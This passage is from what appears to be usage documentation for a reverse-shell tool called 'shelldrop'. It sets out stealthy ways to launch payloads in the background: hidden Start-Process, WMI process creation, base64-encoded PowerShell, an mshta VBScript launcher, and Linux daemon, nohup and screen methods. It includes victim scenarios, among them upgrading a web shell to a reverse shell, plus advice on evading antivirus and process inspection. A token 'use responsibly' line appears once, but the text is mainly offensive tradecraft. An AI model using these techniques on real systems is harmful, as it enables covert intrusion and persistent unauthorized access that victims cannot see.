### Method 2: **Start-Process Hidden** ⭐⭐⭐⭐⭐
```powershell
powershell -c "Start-Process -NoNewWindow -FilePath powershell -ArgumentList '-nop','-w','hidden','-c','...'"
```

**What happens:**
1. Spawns new PowerShell process
2. `-NoNewWindow` prevents visible window
3. Original PowerShell exits
4. New process runs hidden

**Pros:**
- Completely invisible
- No window flashing
- Parent exits cleanly

---

### Method 3: **WMI Process Creation** ⭐⭐⭐⭐⭐
```powershell
powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '...'"
```

**What happens:**
1. Uses WMI (Windows Management Instrumentation)
2. Creates process as separate entity
3. No parent-child relationship
4. Very stealthy

**Pros:**
- Looks like system process
- Hard to trace origin
- No visible parent

---

### Method 4: **Base64 Encoded** ⭐⭐⭐
```powershell
powershell -nop -w hidden -enc <base64_blob>
```

**What happens:**
1. Entire payload is base64 encoded (UTF-16LE)
2. Not visible in command line history
3. Hidden window

**Pros:**
- Obfuscated payload
- Bypasses some AV signatures

---

### Method 5: **VBScript Launcher** ⭐⭐⭐⭐⭐
```cmd
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell..."",0,False:close")
```

**What happens:**
1. `mshta` executes VBScript
2. VBScript launches PowerShell with window hidden (0)
3. `False` = don't wait for completion
4. `close` closes mshta immediately

**Pros:**
- Extremely stealthy
- Instant return
- No PowerShell visible in initial command

---

## 🔍 COMPARISON TABLE

| Method | Returns Terminal? | Survives Logout? | Stealth Level | Platform |
|--------|------------------|------------------|---------------|----------|
| Daemon (Double Fork) | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐⭐ | Linux |
| Background & Exit | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐ | Linux |
| Nohup | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐ | Linux |
| Screen Detached | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐⭐ | Linux |
| Base64 & BG | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐ | Linux |
| Hidden Job | ✅ Instant | ❌ No | ⭐⭐⭐⭐ | Windows |
| Start-Process | ✅ Instant | ⚠️ Maybe | ⭐⭐⭐⭐⭐ | Windows |
| WMI Create | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐⭐ | Windows |
| Base64 Encoded | ✅ Instant | ⚠️ Maybe | ⭐⭐⭐ | Windows |
| VBS Launcher | ✅ Instant | ⚠️ Maybe | ⭐⭐⭐⭐⭐ | Windows |

---

## 🎬 REAL-WORLD USAGE EXAMPLES

### Scenario 1: Quick SSH Access
**Target:** Linux server via SSH
**Goal:** Get shell and exit SSH without suspicion

```bash
# Victim's SSH session:
victim@server:~$ (python3 -c 'DAEMON_PAYLOAD' &) && exit
logout
Connection to server closed.

# Attacker's listener:
shelldrop> [+] Authenticated session: 10.0.0.5:52678 → ID: 1
shelldrop> use 1
shelldrop> whoami
victim
```

**What victim sees:** Just a normal logout, nothing suspicious

---

### Scenario 2: Windows Workstation
**Target:** Windows 10 workstation
**Goal:** Persistent access without detection

```powershell
C:\Users\Victim> powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -nop -w hidden -c PAYLOAD'"

# Process created as system service, invisible
```

**What victim sees:** Command returns instantly, no windows, nothing

---

### Scenario 3: Web Shell Upload
**Target:** Compromised web server
**Goal:** Upgrade web shell to reverse shell

```bash
# In web shell:
nohup python3 -c 'PAYLOAD' >/dev/null 2>&1 &

# Webshell shows: Command executed
# Terminal returns immediately
# Reverse shell connects in background
```

---

## 🛡️ DETECTION EVASION

### What Makes These Stealthy?

1. **No Hanging Terminal**
   - Old way: Terminal freezes (OBVIOUS)
   - New way: Returns instantly (NORMAL)

2. **Process Hierarchy**
   - Daemon: No parent process
   - Screen: Appears as system service
   - WMI: Looks like Windows system process

3. **Command Line Obfuscation**
   - Base64 encoding hides payload
   - `ps aux | grep socket` won't find it

4. **Session Persistence**
   - Survives terminal closure
   - Survives SSH disconnect
   - Survives user logout

---

## 🚀 RECOMMENDED PAYLOADS

### For Linux (BEST):
1. **Screen Detached** - Most invisible
2. **Daemon** - Most robust
3. **Background & Exit** - Cleanest exit

### For Windows (BEST):
1. **WMI Create** - Looks like system process
2. **VBS Launcher** - Extremely stealthy
3. **Start-Process Hidden** - Reliable

---

## 📝 TESTING YOUR PAYLOADS

```bash
# On victim machine, test that terminal returns:
$ python3 -c 'DAEMON_PAYLOAD' &
$  ← Should see prompt immediately

# Verify process is running:
$ ps aux | grep python
[Should see python process]

# Verify you can exit:
$ exit
logout

# Process should still be running (check from another terminal):
$ ps aux | grep python
[Still running!]
```

---

## ⚠️ IMPORTANT NOTES

1. **Authentication is REQUIRED** - All payloads need the correct token
2. **Firewall Rules** - Outbound connections on your port must be allowed
3. **Process Monitoring** - Some EDR will still detect socket connections
4. **Use Responsibly** - Only on authorized systems

---

**You now have 11 different stealthy options instead of just 2!**

All payloads:
✅ Return terminal instantly
✅ Run in background
✅ Are authenticated
✅ Logged by the listener
✅ Multiple obfuscation levels




**Stay Secure. Stay Authenticated. Stay Stealthy. Happy Hacking! 🔒**
